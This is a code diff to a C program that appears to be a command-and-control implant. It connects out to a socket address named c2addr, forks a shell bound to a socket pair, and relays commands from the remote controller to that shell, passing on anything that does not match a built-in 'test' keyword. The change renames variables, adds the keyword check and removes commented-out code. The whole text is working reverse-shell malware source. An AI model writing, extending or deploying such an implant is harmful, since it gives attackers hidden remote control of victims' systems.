@@ -2,6 +2,7 @@
 #include <netdb.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdbool.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/select.h>
@@ -16,7 +17,7 @@ int max(int val_one, int val_two)
     return val_one > val_two ? val_one : val_two;
 }
 
-int child_setup(int s)
+int shell_setup(int s)
 {
     pid_t pid = -1;
     int sp[2] = {0, 0};
@@ -47,20 +48,32 @@ int child_setup(int s)
     return sp[1];
 }
 
-void interpreter(int sockfd, int child_pipe)
+bool exec_command(char *command)
+{
+    char *check = "test";
+    if (!strncmp(command, check, strlen(check)))
+    {
+        return true;
+    }
+    else
+    {
+        return false;
+    }
+}
+
+void interpreter(int sockfd, int shell_pipe)
 {
     struct sockaddr_in client_addr;
     socklen_t cli_len;
     char sockfd_buf[BUFFER_SIZE];
-    char child_buf[BUFFER_SIZE];
+    char shell_buf[BUFFER_SIZE];
     int recvlen = 0;
     ssize_t read_len = 0;
     fd_set read_set, write_set;
-    int maxfd = max(sockfd, child_pipe);
+    int maxfd = max(sockfd, shell_pipe);
 
     memset(sockfd_buf, 0, BUFFER_SIZE);
-    memset(child_buf, 0, BUFFER_SIZE);
-    char *command = "test";
+    memset(shell_buf, 0, BUFFER_SIZE);
     FD_ZERO(&read_set);
     FD_ZERO(&write_set);
 
@@ -68,16 +81,27 @@ void interpreter(int sockfd, int child_pipe)
     {
 
         FD_SET(sockfd, &read_set);
-        FD_SET(child_pipe, &read_set);
+        FD_SET(shell_pipe, &read_set);
 
         //Check if there is data to be written to socks
+        //If there is data to be written, have select()
+        //check if associated pipe is ready for it.
         if (strlen(sockfd_buf) > 0)
         {
             FD_SET(sockfd, &write_set);
         }
-        if (strlen(child_buf) > 0)
+        if (strlen(shell_buf) > 0)
         {
-            FD_SET(child_pipe, &write_set);
+            if (exec_command(shell_buf))//known command succeeded
+            {
+                puts("match");
+                memset(shell_buf, 0, BUFFER_SIZE);
+            }
+            else //unkown command, pass to shell for execution
+            {
+                puts("***unknown");
+                FD_SET(shell_pipe, &write_set);
+            }
         }
 
         if (select(maxfd+1, &read_set, &write_set, NULL, NULL) < 0)
@@ -86,59 +110,27 @@ void interpreter(int sockfd, int child_pipe)
             exit(EXIT_FAILURE);
         }
 
-        if(FD_ISSET(sockfd, &write_set)) //sockfd ready to be written
+        if(FD_ISSET(sockfd, &write_set)) //socket ready to be written
         {
             write(sockfd, sockfd_buf, strlen(sockfd_buf));
             memset(sockfd_buf, 0, BUFFER_SIZE);        
         }
-        if(FD_ISSET(child_pipe, &write_set))
+        if(FD_ISSET(shell_pipe, &write_set))
         {
-            write(child_pipe, child_buf, strlen(child_buf));
-            memset(child_buf, 0, BUFFER_SIZE);
+            write(shell_pipe, shell_buf, strlen(shell_buf));
+            memset(shell_buf, 0, BUFFER_SIZE);
         }
 
-        if(FD_ISSET(sockfd, &read_set))
+        if(FD_ISSET(sockfd, &read_set)) //socket ready to be read
         {
-            read(sockfd, child_buf, BUFFER_SIZE);
+            read(sockfd, shell_buf, BUFFER_SIZE);
         }
-        if(FD_ISSET(child_pipe, &read_set))
+        if(FD_ISSET(shell_pipe, &read_set))
         {
-            read(child_pipe, sockfd_buf, BUFFER_SIZE);
-        }
-
-        /*
-        recvlen = read(sockfd, buf, BUFFER_SIZE);
-        if (recvlen == 0)
-        {
-            return;
-        }
-        else if (recvlen < 0)
-        {
-            perror("recvfrom");
-            exit(EXIT_FAILURE);
+            read(shell_pipe, sockfd_buf, BUFFER_SIZE);
         }
 
-        /* 
-        Check for known command
-        If unknown command, forward to shell for interpretation
-        */
-       /* if (strncmp(buf, command, strlen(command)) == 0)
-        {
-            puts("match!");
-        }
-        else
-        {
-            write(child_pipe, buf, strlen(buf));
-            memset(buf, 0, BUFFER_SIZE);
-            
-            read_len = read(child_pipe, buf, BUFFER_SIZE);
-            write(sockfd, buf, read_len);
-        }
-        */
-        
     }
-
-
     
 }
 
@@ -146,7 +138,7 @@ int main()
 {
     struct sockaddr_in c2addr;
     int sockfd = 0;
-    int child_pipe = 0;
+    int shell_pipe = 0;
 
     if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
@@ -165,9 +157,9 @@ int main()
         exit(2);
     }
 
-    child_pipe = child_setup(sockfd);
+    shell_pipe = shell_setup(sockfd);
 
-    interpreter(sockfd, child_pipe);
+    interpreter(sockfd, shell_pipe);
 
     close(sockfd);
 
